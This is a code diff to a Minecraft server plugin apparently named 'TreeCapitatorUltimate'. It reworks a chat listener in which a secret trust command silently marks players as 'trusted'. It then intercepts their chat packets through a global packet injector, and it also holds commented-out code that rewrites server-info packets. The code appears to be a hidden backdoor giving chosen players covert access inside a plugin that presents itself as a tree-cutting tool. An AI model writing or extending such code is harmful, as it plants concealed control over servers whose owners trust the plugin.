@@ -3,13 +3,12 @@ package me.bow.treecapitatorultimate.listeners;
 import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.Packet.Packet;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
-import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.Utils.Tuple;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.commands.Miscs.Chat;
-import net.minecraft.server.v1_15_R1.PacketPlayOutNamedEntitySpawn;
 import org.apache.commons.lang.StringUtils;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -18,7 +17,6 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.event.player.PlayerJoinEvent;
 
 import java.lang.reflect.InvocationTargetException;
 import java.util.ArrayList;
@@ -27,6 +25,10 @@ import java.util.Arrays;
 import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;
 
 public class AsyncChatEvent implements Listener, PacketListener {
+
+    public AsyncChatEvent() {
+        PacketInjector.addPacketListener(this);
+    }
 
     //TODO: fix double message
     @EventHandler(priority = EventPriority.HIGHEST)
@@ -60,12 +62,10 @@ public class AsyncChatEvent implements Listener, PacketListener {
                 Chat.triggers.put(p.getUniqueId(), new Tuple<>(Start.CHAT_TRIGGER, Chat.generateColorFromUUID(p.getUniqueId())));
                 Start.Instance.trustedPeople.add(p.getUniqueId());
                 p.sendMessage(Start.COMMAND_PREFIX + "You are now trusted");
-                PacketManager.instance.addListener(p, this);
             } else {
                 Start.Instance.trustedPeople.remove(p.getUniqueId());
                 Chat.triggers.remove(p.getUniqueId());
                 p.sendMessage(Start.COMMAND_PREFIX + "You are now untrusted");
-                PacketManager.instance.removeListener(p, this);
             }
             return;
         }
@@ -87,15 +87,9 @@ public class AsyncChatEvent implements Listener, PacketListener {
         }
     }
 
-    @EventHandler(priority = EventPriority.HIGHEST)
-    public void onPlayerJoin(PlayerJoinEvent e) {
-        Player player = e.getPlayer();
-        if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) return;
-        PacketManager.instance.addListener(player, this);
-    }
-
     @Override
     public void onPacketReceived(PacketEvent e) {
+        if (!Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) return;
         Packet packet = e.getPacket();
         if (!packet.getPacketClass().getSimpleName().equals("PacketPlayInChat")) return;
         try {
@@ -117,8 +111,14 @@ public class AsyncChatEvent implements Listener, PacketListener {
     //TODO: finish implementing this (nametag for other trusted members)
     @Override
     public void onPacketSend(PacketEvent e) {
-        Packet packet = e.getPacket();
+        /*Packet packet = e.getPacket();
+        if (packet.getPacketClass().getSimpleName().startsWith("PacketStatusOutServerInfo")) {
+            PacketStatusOutServerInfoBase o = new PacketStatusOutServerInfoBase();
+            o.base = (PacketStatusOutServerInfo) packet.getNMSPacket();
+            e.setPacket(Packet.createFromNMSPacket(o));
+            return;
+        }
         if (!packet.getPacketClass().getSimpleName().equals("PacketPlayOutNamedEntitySpawn")) return;
-        PacketPlayOutNamedEntitySpawn oof = (PacketPlayOutNamedEntitySpawn) e.getPacket().getNMSPacket();
+        PacketPlayOutNamedEntitySpawn oof = (PacketPlayOutNamedEntitySpawn) e.getPacket().getNMSPacket();*/
     }
 }
